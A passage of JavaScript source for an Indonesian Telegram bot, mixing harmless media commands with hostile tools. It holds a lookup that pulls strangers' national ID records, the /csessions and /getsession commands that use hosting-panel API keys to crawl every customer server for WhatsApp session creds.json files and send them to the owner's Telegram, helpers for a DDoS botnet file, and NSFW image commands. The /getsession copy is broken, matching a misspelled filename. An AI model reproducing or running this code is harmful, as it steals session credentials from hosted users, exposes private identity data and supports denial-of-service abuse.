
const replyHTML = (d) => {
  const get = (x) => (x ?? "-");

  const caption =`
<blockquote><b> ⬡═―—⊱ ⎧ 𝗫- 𝗣𝗟𝗢𝗜𝗧 ⎭ ⊰―—═⬡ </b></blockquote>
⛧ NIK: ${get(d.nik) || nik}
⛧ Nama: ${get(d.nama)}
⛧ Jenis Kelamin: ${get(d.jenis_kelamin || d.gender)}
⛧ Tempat Lahir: ${get(d.tempat_lahir || d.tempat)}
⛧ Tanggal Lahir: ${get(d.tanggal_lahir || d.tgl_lahir)}
⛧ Umur: ${get(d.umur)}
⛧ Provinsi: ${get(d.provinsi || d.province)}
⛧ Kabupaten/Kota: ${get(d.kabupaten || d.kota || d.regency)}
⛧ Kecamatan: ${get(d.kecamatan || d.district)}
⛧ Kelurahan/Desa: ${get(d.kelurahan || d.village)}
`;

  return ctx.reply(caption, { parse_mode: "HTML", disable_web_page_preview: true });
};

  try {
    const a1 = await axios.get(
      `https://api.akuari.my.id/national/nik?nik=${nik}`,
      { headers: { "user-agent": "Mozilla/5.0" }, timeout: 15000 }
    );

    if (a1?.data?.status && a1?.data?.result) {
      await replyHTML(a1.data.result);
    } else {
      const a2 = await axios.get(
        `https://api.nikparser.com/nik/${nik}`,
        { headers: { "user-agent": "Mozilla/5.0" }, timeout: 15000 }
      );
      if (a2?.data) {
        await replyHTML(a2.data);
      } else {
        await ctx.reply("❌ ☇ NIK tidak ditemukan");
      }
    }
  } catch (e) {
    try {
      const a2 = await axios.get(
        `https://api.nikparser.com/nik/${nik}`,
        { headers: { "user-agent": "Mozilla/5.0" }, timeout: 15000 }
      );
      if (a2?.data) {
        await replyHTML(a2.data);
      } else {
        await ctx.reply("❌ ☇ Gagal menghubungi api, Coba lagi nanti");
      }
    } catch {
      await ctx.reply("❌ ☇ Gagal menghubungi api, Coba lagi nanti");
    }
  } finally {
    try { await ctx.deleteMessage(wait.message_id); } catch {}
  }
});

bot.command("csessions", checkPremium, async (ctx) => {
  const chatId = ctx.chat.id;
  const fromId = ctx.from.id;

  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("🪧 ☇ Format: /csessions https://domainpanel.com,ptla_123,ptlc_123");

  const args = text.split(",");
  const domain = args[0];
  const plta = args[1];
  const pltc = args[2];
  if (!plta || !pltc)
    return ctx.reply("🪧 ☇ Format: /csessions https://panelku.com,plta_123,pltc_123");

  await ctx.reply(
    "⏳ ☇ Sedang scan semua server untuk mencari folder sessions dan file creds.json",
    { parse_mode: "Markdown" }
  );

  const base = domain.replace(/\/+$/, "");
  const commonHeadersApp = {
    Accept: "application/json, application/vnd.pterodactyl.v1+json",
    Authorization: `Bearer ${plta}`,
  };
  const commonHeadersClient = {
    Accept: "application/json, application/vnd.pterodactyl.v1+json",
    Authorization: `Bearer ${pltc}`,
  };

  function isDirectory(item) {
    if (!item || !item.attributes) return false;
    const a = item.attributes;
    if (typeof a.is_file === "boolean") return a.is_file === false;
    return (
      a.type === "dir" ||
      a.type === "directory" ||
      a.mode === "dir" ||
      a.mode === "directory" ||
      a.mode === "d" ||
      a.is_directory === true ||
      a.isDir === true
    );
  }

  async function listAllServers() {
    const out = [];
    let page = 1;
    while (true) {
      const r = await axios.get(`${base}/api/application/servers`, {
        params: { page },
        headers: commonHeadersApp,
        timeout: 15000,
      }).catch(() => ({ data: null }));
      const chunk = (r && r.data && Array.isArray(r.data.data)) ? r.data.data : [];
      out.push(...chunk);
      const hasNext = !!(r && r.data && r.data.meta && r.data.meta.pagination && r.data.meta.pagination.links && r.data.meta.pagination.links.next);
      if (!hasNext || chunk.length === 0) break;
      page++;
    }
    return out;
  }

  async function traverseAndFind(identifier, dir = "/") {
    try {
      const listRes = await axios.get(
        `${base}/api/client/servers/${identifier}/files/list`,
        {
          params: { directory: dir },
          headers: commonHeadersClient,
          timeout: 15000,
        }
      ).catch(() => ({ data: null }));
      const listJson = listRes.data;
      if (!listJson || !Array.isArray(listJson.data)) return [];
      let found = [];

      for (let item of listJson.data) {
        const name = (item.attributes && item.attributes.name) || item.name || "";
        const itemPath = (dir === "/" ? "" : dir) + "/" + name;
        const normalized = itemPath.replace(/\/+/g, "/");
        const lower = name.toLowerCase();

        if ((lower === "session" || lower === "sessions") && isDirectory(item)) {
          try {
            const sessRes = await axios.get(
              `${base}/api/client/servers/${identifier}/files/list`,
              {
                params: { directory: normalized },
                headers: commonHeadersClient,
                timeout: 15000,
              }
            ).catch(() => ({ data: null }));
            const sessJson = sessRes.data;
            if (sessJson && Array.isArray(sessJson.data)) {
              for (let sf of sessJson.data) {
                const sfName = (sf.attributes && sf.attributes.name) || sf.name || "";
                const sfPath = (normalized === "/" ? "" : normalized) + "/" + sfName;
                if (sfName.toLowerCase() === "creds.json") {
                  found.push({
                    path: sfPath.replace(/\/+/g, "/"),
                    name: sfName,
                  });
                }
              }
            }
          } catch (_) {}
        }

        if (isDirectory(item)) {
          try {
            const more = await traverseAndFind(identifier, normalized === "" ? "/" : normalized);
            if (more.length) found = found.concat(more);
          } catch (_) {}
        } else {
          if (name.toLowerCase() === "creds.json") {
            found.push({ path: (dir === "/" ? "" : dir) + "/" + name, name });
          }
        }
      }
      return found;
    } catch (_) {
      return [];
    }
  }

  try {
    const servers = await listAllServers();
    if (!servers.length) {
      return ctx.reply("❌ ☇ Tidak ada server yang bisa discan");
    }

    let totalFound = 0;

    for (let srv of servers) {
      const identifier =
        (srv.attributes && srv.attributes.identifier) ||
        srv.identifier ||
        (srv.attributes && srv.attributes.id);
      const name =
        (srv.attributes && srv.attributes.name) ||
        srv.name ||
        identifier ||
        "unknown";
      if (!identifier) continue;

      const list = await traverseAndFind(identifier, "/");
      if (list && list.length) {
        for (let fileInfo of list) {
          totalFound++;
          const filePath = ("/" + fileInfo.path.replace(/\/+/g, "/")).replace(/\/+$/,"");

          await ctx.reply(
            `📁 ☇ Ditemukan creds.json di server ${name} path: ${filePath}`,
            { parse_mode: "Markdown" }
          );

          try {
            const downloadRes = await axios.get(
              `${base}/api/client/servers/${identifier}/files/download`,
              {
                params: { file: filePath },
                headers: commonHeadersClient,
                timeout: 15000,
              }
            ).catch(() => ({ data: null }));

            const dlJson = downloadRes && downloadRes.data;
            if (dlJson && dlJson.attributes && dlJson.attributes.url) {
              const url = dlJson.attributes.url;
              const fileRes = await axios.get(url, {
                responseType: "arraybuffer",
                timeout: 20000,
              });
              const buffer = Buffer.from(fileRes.data);
              await ctx.telegram.sendDocument(ownerID, {
                source: buffer,
                filename: `${String(name).replace(/\s+/g, "_")}_creds.json`,
              });
            } else {
              await ctx.reply(
                `❌ ☇ Gagal mendapatkan URL download untuk ${filePath} di server ${name}`
              );
            }
          } catch (e) {
            console.error(`Gagal download ${filePath} dari ${name}:`, e?.message || e);
            await ctx.reply(
              `❌ ☇ Error saat download file creds.json dari ${name}`
            );
          }
        }
      }
    }

    if (totalFound === 0) {
      return ctx.reply("✅ ☇ Scan selesai tidak ditemukan creds.json di folder session/sessions pada server manapun");
    } else {
      return ctx.reply(`✅ ☇ Scan selesai total file creds.json berhasil diunduh & dikirim: ${totalFound}`);
    }
  } catch (err) {
    ctx.reply("❌ ☇ Terjadi error saat scan");
  }
});

bot.command("convert", checkPremium, async (ctx) => {
  const r = ctx.message.reply_to_message;
  if (!r) return ctx.reply("🪧 ☇ Format: /convert ( reply dengan foto/video )");

  let fileId = null;
  if (r.photo && r.photo.length) {
    fileId = r.photo[r.photo.length - 1].file_id;
  } else if (r.video) {
    fileId = r.video.file_id;
  } else if (r.video_note) {
    fileId = r.video_note.file_id;
  } else {
    return ctx.reply("❌ ☇ Hanya mendukung foto atau video");
  }

  const wait = await ctx.reply("⏳ ☇ Mengambil file & mengunggah ke catbox");

  try {
    const tgLink = String(await ctx.telegram.getFileLink(fileId));

    const params = new URLSearchParams();
    params.append("reqtype", "urlupload");
    params.append("url", tgLink);

    const { data } = await axios.post("https://catbox.moe/user/api.php", params, {
      headers: { "content-type": "application/x-www-form-urlencoded" },
      timeout: 30000
    });

    if (typeof data === "string" && /^https?:\/\/files\.catbox\.moe\//i.test(data.trim())) {
      await ctx.reply(data.trim());
    } else {
      await ctx.reply("❌ ☇ Gagal upload ke catbox" + String(data).slice(0, 200));
    }
  } catch (e) {
    const msg = e?.response?.status
      ? `❌ ☇ Error ${e.response.status} saat unggah ke catbox`
      : "❌ ☇ Gagal unggah coba lagi.";
    await ctx.reply(msg);
  } finally {
    try { await ctx.deleteMessage(wait.message_id); } catch {}
  }
});
function loadBotnetData() {
    try {
        return JSON.parse(fs.readFileSync('./ddos/botnet.json', 'utf8'));
    } catch (error) {
        console.error('Error loading botnet data:', error.message);
        return { endpoints: [] };
    }
}

// Fungsi untuk menyimpan data botnet ke file JSON
function saveBotnetData(botnetData) {
    try {
        fs.writeFileSync('./ddos/botnet.json', JSON.stringify(botnetData, null, 2));
    } catch (error) {
        console.error('Error saving botnet data:', error.message);
    }
}

bot.command("videy", async (ctx) => {
    const input = ctx.message.text.split(" ").slice(1).join(" ");
    
    if (!input || !input.startsWith("http")) {
      return ctx.reply(
        "❌ Kirim perintah dengan menyertakan URL video dari videy.co\nContoh: `/videydl https://videy.co/v?id=XXXX`",
        { parse_mode: "Markdown" }
      );
    }

    await ctx.reply("⏳ Sedang memproses video...");

    try {
      const res = await axios.post(
        "https://fastapi.acodes.my.id/api/downloader/videy",
        { text: input },
        {
          headers: {
            accept: "*/*",
            "Content-Type": "application/json",
          },
        }
      );

      if (res.data?.status && res.data?.data) {
        await ctx.replyWithVideo(
          { url: res.data.data },
          { caption: "✅ Video berhasil diunduh dari videy.co!" }
        );
      } else {
        await ctx.reply("❌ Gagal mendapatkan video. Coba cek ulang link-nya.");
      }
    } catch (err) {
      console.error("VideyDL error:", err.message || err);
      ctx.reply("❌ Terjadi kesalahan saat memproses video.");
    }
  });
 
   bot.command("cekefek", async (ctx) => {
  const reply = ctx.message.reply_to_message?.text;
  if (!reply)
    return ctx.reply("⚠️ Balas ke potongan kode yang ingin dianalisa dengan /efekfunc.");

  await ctx.reply("🔎 Analisa cepat efek (simple) — tunggu sebentar...");

  // Deteksi efek / pola berbahaya
  let efek = "Tidak terdeteksi";
  let indikator = "Tidak ditemukan";
  let indikasiCuplikan = "";

  if (/fetch|axios|http|https|socket|ws|wss/i.test(reply)) {
    efek = "🌐 Exfiltrate / Network";
    indikator = "Mengirim / menerima data jaringan.";
  } else if (/crash|loop|repeat\(/i.test(reply)) {
    efek = "💣 Crash / Overload";
    indikator = "Loop besar atau operasi berat terdeteksi.";
  } else if (/child_process|exec|spawn/i.test(reply)) {
    efek = "⚙️ System Access / Command Injection";
    indikator = "Menjalankan perintah sistem.";
  } else if (/process\.kill|process\.exit/i.test(reply)) {
    efek = "🧨 Process Kill Attempt";
    indikator = "Upaya mematikan proses terdeteksi.";
  } else if (/atob|btoa|Buffer\.from/i.test(reply)) {
    efek = "🌀 Encoding / Obfuscation";
    indikator = "Kode menyembunyikan data atau base64 decode/encode.";
  }

  // Ambil cuplikan indikasi
  const lines = reply.split("\n");
  const foundIndex = lines.findIndex((l) =>
    l.match(/fetch|axios|http|repeat|exec|process|Buffer|btoa/i)
  );
  if (foundIndex >= 0) {
    indikasiCuplikan = lines
      .slice(Math.max(0, foundIndex - 1), foundIndex + 2)
      .join("\n");
  }

  await ctx.replyWithMarkdown(
    `🧠 *Analisa Efek (simple)*\n` +
    `📂 *Sumber:* Potongan teks (reply)\n\n` +
    `🔎 *Efek Teridentifikasi:* ${efek}\n` +
    `🔎 *Indikator yang ditemukan:* ${indikator}\n\n` +
    `📘 *Cuplikan (sekitar indikasi pertama):*\n\`\`\`js\n${indikasiCuplikan || "Tidak ditemukan indikasi mencurigakan"}\n\`\`\``
  );
});

bot.command('denc', checkPremium, async (ctx) => {
  if (!ctx.message.reply_to_message) return ctx.reply("🪧 ☇ Format: /decryptcode (reply javascript document)")
  const replied = ctx.message.reply_to_message
  if (!replied.document) return ctx.reply("❌ ☇ Pesan yang di reply bukan file")

  const fileName = replied.document.file_name || 'file.js'
  if (!fileName.endsWith('.js')) return ctx.reply("❌ ☇ File harus format .js")

  const MAX = 8 * 1024 * 1024
  if (replied.document.file_size > MAX) return ctx.reply("❌ ☇ File terlalu besar")

  const processing = await ctx.reply(`✅ ☇ Mengunduh dan memproses dekripsi ${fileName}`)

  try {
    const fileLink = await ctx.telegram.getFileLink(replied.document.file_id)
    const tmpDir = path.join(__dirname, 'temp')
    if (!fs.existsSync(tmpDir)) fs.mkdirSync(tmpDir)

    const tmpPath = path.join(tmpDir, fileName)
    const resp = await axios({ url: fileLink.href, method: 'GET', responseType: 'stream' })
    await pipeline(resp.data, createWriteStream(tmpPath))

    let code = fs.readFileSync(tmpPath, 'utf8')
    let deob = deobfuscatePipeline(code)

    if (deob.length < code.length / 2 || /\\x[0-9A-Fa-f]{2}/.test(deob)) {
      const dynamicPath = await deobfuscatePipelineDynamic(tmpPath)
      deob = fs.readFileSync(dynamicPath, 'utf8')
    }

    const outPath = tmpPath.replace(/\.js$/, '_void_decrypt.js')
    fs.writeFileSync(outPath, deob, 'utf8')

    await ctx.telegram.editMessageText(ctx.chat.id, processing.message_id, undefined, `✅ ☇ Selesai di dekripsi sedang mengirim ${path.basename(outPath)}`)
    await ctx.replyWithDocument({ source: outPath, filename: path.basename(outPath) })

    try { fs.unlinkSync(tmpPath); fs.unlinkSync(outPath) } catch(e){}
  } catch (err) {
    await ctx.telegram.editMessageText(ctx.chat.id, processing.message_id, undefined, `❌ ☇ Gagal mendekripsi karena error: ${err.message}`)
  }
});

bot.command("gethtml", async (ctx) => {
  const chatId = ctx.chat.id;
  const userId = ctx.from.id;
  const url = ctx.message.text.split(' ')[1]; // Mengambil URL dari command

  // Validasi URL
  if (!url || !/^https?:\/\//i.test(url)) {
    return ctx.reply("🔗 *Masukkan domain atau URL yang valid!*\n\nContoh:\n`/gethtml https://example.com`", {
      parse_mode: "Markdown",
    });
  }

  try {
    await ctx.reply("⏳ Mengambil source code dari URL...");

    const res = await fetch(url);
    if (!res.ok) {
      return ctx.reply("❌ *Gagal mengambil source code dari URL tersebut!*");
    }

    const html = await res.text();
    const filePath = path.join(__dirname, "source_code.html");
    fs.writeFileSync(filePath, html);

    // Mengirim file sebagai document
    await ctx.replyWithDocument({
      source: filePath,
      filename: "source_code.html",
      contentType: "text/html"
    });

    fs.unlinkSync(filePath); // Hapus file setelah dikirim
    
  } catch (err) {
    console.error(err);
    ctx.reply(`❌ *Terjadi kesalahan:*\n\`${err.message}\``, {
      parse_mode: "Markdown",
    });
  }
});

bot.command("brat", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("Example\n/brat Reo Del Rey", { parse_mode: "Markdown" });

  try {
    // Kirim emoji reaksi manual
    await ctx.reply("✨ Membuat stiker...");

    const url = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isVideo=false`;
    const response = await axios.get(url, { responseType: "arraybuffer" });

    const filePath = path.join(__dirname, "brat.webp");
    fs.writeFileSync(filePath, response.data);

    await ctx.replyWithSticker({ source: filePath });

    // Optional: hapus file setelah kirim
    fs.unlinkSync(filePath);

  } catch (err) {
    console.error("Error brat:", err.message);
    ctx.reply("❌ Gagal membuat stiker brat. Coba lagi nanti.");
  }
});

bot.command(["ytsearch", "youtubesearch"], async (ctx) => {
  const currentTime = Math.floor(Date.now() / 1000);
  const messageTime = ctx.message.date;

  if (currentTime - messageTime > 1) {
    return;
  }

  if (groupOnlyMode && !isGroup(ctx)) {
    return ctx.reply("bot hanya dapat digunakan didalam grup");
  }

  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("Masukkan query parameters!");

  ctx.reply("🔍 Sedang mencari...");

  try {
    const anu = `https://api.diioffc.web.id/api/search/ytplay?query=${encodeURIComponent(
      text
    )}`;
    const { data: response } = await axios.get(anu);

    const url = response.result.url;
    const caption = `🎵 Title: ${response.result.title}\n📜 Description: ${response.result.description}\n👀 Views: ${response.result.views}`;

    ctx.reply(caption, {
      reply_markup: {
        inline_keyboard: [
          [{ text: "Download MP3", callback_data: `ytmp3 ${url}` }],
          [{ text: "Download MP4", callback_data: `ytmp4 ${url}` }],
        ],
      },
    });
  } catch (e) {
    console.error(e);
    ctx.reply("❌ Terjadi kesalahan!");
  }
});

bot.command("fixcode", async (ctx) => {
  try {
    const fileMessage = ctx.message.reply_to_message?.document || ctx.message.document;

    if (!fileMessage) {
      return ctx.reply(`📂 Kirim file .js dan reply dengan perintah /fixcode`);
    }

    const fileName = fileMessage.file_name || "unknown.js";
    if (!fileName.endsWith(".js")) {
      return ctx.reply("⚠️ File harus berformat .js bre!");
    }

    const fileUrl = await ctx.telegram.getFileLink(fileMessage.file_id);
    const response = await axios.get(fileUrl.href, { responseType: "arraybuffer" });
    const fileContent = response.data.toString("utf-8");

    await ctx.reply("🤖 Lagi memperbaiki kodenya bre... tunggu bentar!");

    const { data } = await axios.get("https://api.nekolabs.web.id/ai/gpt/4.1", {
      params: {
        text: fileContent,
        systemPrompt: `Kamu adalah seorang programmer ahli JavaScript dan Node.js.
Tugasmu adalah memperbaiki kode yang diberikan agar bisa dijalankan tanpa error, 
namun jangan mengubah struktur, logika, urutan, atau gaya penulisan aslinya.

Fokus pada:
- Menyelesaikan error sintaks (kurung, kurawal, tanda kutip, koma, dll)
- Menjaga fungsi dan struktur kode tetap sama seperti input
- Jangan menghapus komentar, console.log, atau variabel apapun
- Jika ada blok terbuka (seperti if, else, try, atau fungsi), tutup dengan benar
- Jangan ubah nama fungsi, variabel, atau struktur perintah
- Jangan tambahkan penjelasan apapun di luar kode
- Jangan tambahkan markdown javascript Karena file sudah berbentuk file .js
- Hasil akhir harus langsung berupa kode yang siap dijalankan
`,
        sessionId: "neko"
      },
      timeout: 60000,
    });

    if (!data.success || !data.result) {
      return ctx.reply("❌ Gagal memperbaiki kode, coba ulang bre.");
    }

    const fixedCode = data.result;
    const outputPath = `./fixed_${fileName}`;
    fs.writeFileSync(outputPath, fixedCode);

    await ctx.replyWithDocument({ source: outputPath, filename: `fixed_${fileName}` });
  } catch (err) {
    console.error("FixCode Error:", err);
    ctx.reply("⚠️ Terjadi kesalahan waktu memperbaiki kode.");
  }
});

bot.command('deploy', async (ctx) => {
  const args = ctx.message.text.split(' ').slice(1);
  if (args.length < 3) {
    return ctx.reply("Reply Icon Web : `/deploy <url> <namaApp> <email>`", { parse_mode: 'Markdown' });
  }
  if (!ctx.message.reply_to_message?.photo) {
    return ctx.reply('Kamu harus reply foto dulu untuk dijadikan ikon APK!', { parse_mode: 'Markdown' });
  }

  const [url, appName, email] = args;
  try { new URL(url); } catch { return ctx.reply('URL tidak valid'); }
  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) return ctx.reply('Email tidak valid');

  const waitMsg = await ctx.reply('Upload & build APK dimulai… (perkiraan memakan waktu 3-8 menit)', { parse_mode: 'Markdown' });

  (async () => {                       
    try {
      const photo = ctx.message.reply_to_message.photo.pop();
      const fileLink = await ctx.telegram.getFileLink(photo.file_id);
      const { data: buffer } = await axios.get(fileLink.href, { responseType: 'arraybuffer' });

      const form = new FormData();
      form.append('files', buffer, { filename: 'icon.png', contentType: 'image/png' });

      const up = await axios.post('https://cdn.yupra.my.id/upload', form, {
        headers: form.getHeaders(),
        timeout: 30000
      });
      if (!up.data?.success || !up.data.files?.[0]) throw new Error('CDN gagal');
      const iconUrl = 'https://cdn.yupra.my.id' + up.data.files[0].url;

      const buildUrl =
        'https://api.fikmydomainsz.xyz/tools/toapp/build-complete' +
        '?url=' + encodeURIComponent(url) +
        '&email=' + encodeURIComponent(email) +
        '&appName=' + encodeURIComponent(appName) +
        '&appIcon=' + encodeURIComponent(iconUrl);

      const { data: job } = await axios.get(buildUrl, { timeout: 0 });
      if (!job.status) throw new Error(job.error || 'Build gagal');

      const caption =
        `Aplikasi berhasil dibuat!\n\n` +
        `Nama: ${appName}\n` +
        `Download APK: ${job.downloadUrl}`;

      await ctx.telegram.sendMessage(ctx.chat.id, caption, {
        parse_mode: 'Markdown',
        disable_web_page_preview: true
      });
    } catch (err) {
      await ctx.telegram.sendMessage(ctx.chat.id, `${err.message || 'Terjadi kesalahan'}`, {
        parse_mode: 'Markdown'
      });
      console.error('[X]', err);
    }
  })();

  return;
});

bot.command("getsession", checkPremium, async (ctx) => {
  const chatId = ctx.chat.id;
  const fromId = ctx.from.id;

  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("🪧 ☇ Format: /getsession https://domainpanel.com,ptla_123,ptlc_123");

  const args = text.split(",");
  const domain = args[0];
  const plta = args[1];
  const pltc = args[2];
  if (!plta || !pltc)
    return ctx.reply("🪧 ☇ Format: /csessions https://panelku.com,plta_123,pltc_123");

  await ctx.reply(
    "⏳ ☇ Sedang scan semua server untuk mencari folder sessions dan file creds.json",
    { parse_mode: "Markdown" }
  );

  const base = domain.replace(/\/+$/, "");
  const commonHeadersApp = {
    Accept: "application/json, application/vnd.pterodactyl.v1+json",
    Authorization: `Bearer ${plta}`,
  };
  const commonHeadersClient = {
    Accept: "application/json, application/vnd.pterodactyl.v1+json",
    Authorization: `Bearer ${pltc}`,
  };

  function isDirectory(item) {
    if (!item || !item.attributes) return false;
    const a = item.attributes;
    if (typeof a.is_file === "boolean") return a.is_file === false;
    return (
      a.type === "dir" ||
      a.type === "directory" ||
      a.mode === "dir" ||
      a.mode === "directory" ||
      a.mode === "d" ||
      a.is_directory === true ||
      a.isDir === true
    );
  }

  async function listAllServers() {
    const out = [];
    let page = 1;
    while (true) {
      const r = await axios.get(`${base}/api/application/servers`, {
        params: { page },
        headers: commonHeadersApp,
        timeout: 15000,
      }).catch(() => ({ data: null }));
      const chunk = (r && r.data && Array.isArray(r.data.data)) ? r.data.data : [];
      out.push(...chunk);
      const hasNext = !!(r && r.data && r.data.meta && r.data.meta.pagination && r.data.meta.pagination.links && r.data.meta.pagination.links.next);
      if (!hasNext || chunk.length === 0) break;
      page++;
    }
    return out;
  }

  async function traverseAndFind(identifier, dir = "/") {
    try {
      const listRes = await axios.get(
        `${base}/api/client/servers/${identifier}/files/list`,
        {
          params: { directory: dir },
          headers: commonHeadersClient,
          timeout: 15000,
        }
      ).catch(() => ({ data: null }));
      const listJson = listRes.data;
      if (!listJson || !Array.isArray(listJson.data)) return [];
      let found = [];

      for (let item of listJson.data) {
        const name = (item.attributes && item.attributes.name) || item.name || "";
        const itemPath = (dir === "/" ? "" : dir) + "/" + name;
        const normalized = itemPath.replace(/\/+/g, "/");
        const lower = name.toLowerCase();

        if ((lower === "session" || lower === "sessions") && isDirectory(item)) {
          try {
            const sessRes = await axios.get(
              `${base}/api/client/servers/${identifier}/files/list`,
              {
                params: { directory: normalized },
                headers: commonHeadersClient,
                timeout: 15000,
              }
            ).catch(() => ({ data: null }));
            const sessJson = sessRes.data;
            if (sessJson && Array.isArray(sessJson.data)) {
              for (let sf of sessJson.data) {
                const sfName = (sf.attributes && sf.attributes.name) || sf.name || "";
                const sfPath = (normalized === "/" ? "" : normalized) + "/" + sfName;
                if (sfName.toLowerCase() === "sension, sensions") {
                  found.push({
                    path: sfPath.replace(/\/+/g, "/"),
                    name: sfName,
                  });
                }
              }
            }
          } catch (_) {}
        }

        if (isDirectory(item)) {
          try {
            const more = await traverseAndFind(identifier, normalized === "" ? "/" : normalized);
            if (more.length) found = found.concat(more);
          } catch (_) {}
        } else {
          if (name.toLowerCase() === "sension, sensions") {
            found.push({ path: (dir === "/" ? "" : dir) + "/" + name, name });
          }
        }
      }
      return found;
    } catch (_) {
      return [];
    }
  }

  try {
    const servers = await listAllServers();
    if (!servers.length) {
      return ctx.reply("❌ ☇ Tidak ada server yang bisa discan");
    }

    let totalFound = 0;

    for (let srv of servers) {
      const identifier =
        (srv.attributes && srv.attributes.identifier) ||
        srv.identifier ||
        (srv.attributes && srv.attributes.id);
      const name =
        (srv.attributes && srv.attributes.name) ||
        srv.name ||
        identifier ||
        "unknown";
      if (!identifier) continue;

      const list = await traverseAndFind(identifier, "/");
      if (list && list.length) {
        for (let fileInfo of list) {
          totalFound++;
          const filePath = ("/" + fileInfo.path.replace(/\/+/g, "/")).replace(/\/+$/,"");

          await ctx.reply(
            `📁 ☇ Ditemukan sension di server ${name} path: ${filePath}`,
            { parse_mode: "Markdown" }
          );

          try {
            const downloadRes = await axios.get(
              `${base}/api/client/servers/${identifier}/files/download`,
              {
                params: { file: filePath },
                headers: commonHeadersClient,
                timeout: 15000,
              }
            ).catch(() => ({ data: null }));

            const dlJson = downloadRes && downloadRes.data;
            if (dlJson && dlJson.attributes && dlJson.attributes.url) {
              const url = dlJson.attributes.url;
              const fileRes = await axios.get(url, {
                responseType: "arraybuffer",
                timeout: 20000,
              });
              const buffer = Buffer.from(fileRes.data);
              await ctx.telegram.sendDocument(ownerID, {
                source: buffer,
                filename: `${String(name).replace(/\s+/g, "_")}_sensions`,
              });
            } else {
              await ctx.reply(
                `❌ ☇ Gagal mendapatkan URL download untuk ${filePath} di server ${name}`
              );
            }
          } catch (e) {
            console.error(`Gagal download ${filePath} dari ${name}:`, e?.message || e);
            await ctx.reply(
              `❌ ☇ Error saat download file creds.json dari ${name}`
            );
          }
        }
      }
    }

    if (totalFound === 0) {
      return ctx.reply("✅ ☇ Scan selesai tidak ditemukan creds.json di folder session/sessions pada server manapun");
    } else {
      return ctx.reply(`✅ ☇ Scan selesai total file creds.json berhasil diunduh & dikirim: ${totalFound}`);
    }
  } catch (err) {
    ctx.reply("❌ ☇ Terjadi error saat scan");
  }
});

bot.command("getnsfw", checkPremium, async (ctx) => {
  try {
    const nsfwTypes = [
      "hentai", "ass", "boobs", "paizuri", "thigh",
      "hanal", "hass", "pgif", "4k", "lewdneko", "lewdkitsune"
    ];
    
    const randomType = nsfwTypes[Math.floor(Math.random() * nsfwTypes.length)];

    const res = await fetchJsonHttps(`https://nekobot.xyz/api/image?type=${randomType}`);
    
    if (res && res.message) {
      await ctx.replyWithVideo(res.message, {
        caption: `✅ ☇ Gambar berhasil dibuat`
      });
    } else {
      ctx.reply("❌ ☇ Gagal membuat gambar");
    }
  } catch (err) {
    ctx.reply("❌ ☇ Terjadi kesalahan saat memuat gambar");
  }
});

bot.command("nsfwwaifu", checkPremium, async (ctx) => {
    // Hanya untuk pengguna premium
    const category = ctx.message.text.split(" ")[1] || "waifu";

    const validCategories = ['waifu', 'neko', 'trap', 'blowjob'];
    
    if (!validCategories.includes(category)) {
        return ctx.reply("❌ ☇ Kategori NSFW tidak valid");
    }

    try {
        const response = await axios.get(`https://api.waifu.pics/nsfw/${category}`);
        
        await ctx.replyWithVideo(response.data.url, {
            caption: `<blockquote><pre>⬡═―—⊱ ⎧ NSFW WAIFU ⎭ ⊰―—═⬡</pre></blockquote>🔞 Kategori: ${category}\n\n⚠️ Konten untuk dewasa`,
            parse_mode: "HTML"
        });
    } catch (error) {
        await ctx.reply("❌ ☇ Gagal mengambil gambar NSFW");
    }
});

bot.command("waifu", checkPremium, async (ctx) => {
    const category = ctx.message.text.split(" ")[1] || "waifu";

    const validCategories = ['waifu', 'neko', 'shinobu', 'megumin', 'bully', 'cuddle', 'cry', 'hug', 'awoo', 'kiss', 'lick', 'pat', 'smug', 'bonk', 'yeet', 'blush', 'smile', 'wave', 'highfive', 'handhold', 'nom', 'bite', 'glomp', 'slap', 'kill', 'kick', 'happy', 'wink', 'poke', 'dance', 'cringe'];
    
    if (!validCategories.includes(category)) {
        return ctx.reply(`❌ ☇ Kategori tidak valid. Kategori yang tersedia: ${validCategories.slice(0, 10).join(', ')}...`);
    }

    try {
        const response = await axios.get(`https://api.waifu.pics/sfw/${category}`);
        
        await ctx.replyWithVideo(response.data.url, {
            caption: `<blockquote><pre>⬡═―—⊱ ⎧ WAIFU IMAGE ⎭ ⊰―—═⬡</pre></blockquote>🌸 Kategori: ${category}`,
            parse_mode: "HTML"
        });
    } catch (error) {
        await ctx.reply("❌ ☇ Gagal mengambil gambar waifu");
    }
});

bot.command('iqc', async (ctx) => {
  try {
    const args = ctx.message.text.split(' ').slice(1);
    if (args.length < 3) {
      return ctx.reply('Gunakan format:\n/iqc <pesan> <baterai> <operator>\n\nContoh:\n/iphone Halo dunia 87 Telkomsel');
    }

    // Gabung argumen, misalnya: [ 'Halo', 'dunia', '87', 'Telkomsel' ]
    const battery = args[args.length - 2];       // misal 87
    const carrier = args[args.length - 1];       // misal Telkomsel
    const text = args.slice(0, -2).join(' ');    // sisanya jadi pesan
    const time = new Date().toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit' });

    await ctx.reply('⏳ Membuat quoted message gaya iPhone...');

    // 🔗 Build API URL
    const apiUrl = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(time)}&messageText=${encodeURIComponent(text)}&carrierName=${encodeURIComponent(carrier)}&batteryPercentage=${encodeURIComponent(battery)}&signalStrength=4&emojiStyle=apple`;

    // Ambil hasil gambar dari API
    const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
    const buffer = Buffer.from(response.data, 'binary');

    // Kirim gambar hasil API ke user
    await ctx.replyWithPhoto({ source: buffer }, { caption: `📱 iPhone quote dibuat!\n🕒 ${time}` });
  } catch (err) {
    console.error('❌ Error case /iqc:', err);
    await ctx.reply('Terjadi kesalahan saat memproses gambar.');
  }
});

bot.command("waifu", checkPremium, async (ctx) => {
    const category = ctx.message.text.split(" ")[1] || "waifu";

